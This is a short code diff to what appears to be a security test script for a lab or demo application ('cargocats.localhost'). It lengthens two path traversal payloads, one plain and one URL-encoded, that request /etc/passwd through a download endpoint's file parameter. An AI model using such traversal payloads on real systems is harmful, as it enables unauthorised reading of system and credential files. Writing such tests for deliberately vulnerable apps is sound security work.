@@ -1631,7 +1631,7 @@ def run_php_path_traversal_exploit(session):
     # -------------------------------------------------------
     # 2. Classic dotdot traversal: read /etc/passwd
     # -------------------------------------------------------
-    payload = "../../../../etc/passwd"
+    payload = "../../../../../etc/passwd"
     r = session.get(
         f"http://cargocats.localhost/api/tracking-report/download?file={requests.utils.quote(payload)}",
         timeout=15
@@ -1647,7 +1647,7 @@ def run_php_path_traversal_exploit(session):
     # -------------------------------------------------------
     # 3. URL-encoded variant, exercises a second sink trace
     # -------------------------------------------------------
-    encoded_payload = "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    encoded_payload = "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
     r = session.get(
         f"http://cargocats.localhost/api/tracking-report/download?file={encoded_payload}",
         timeout=15
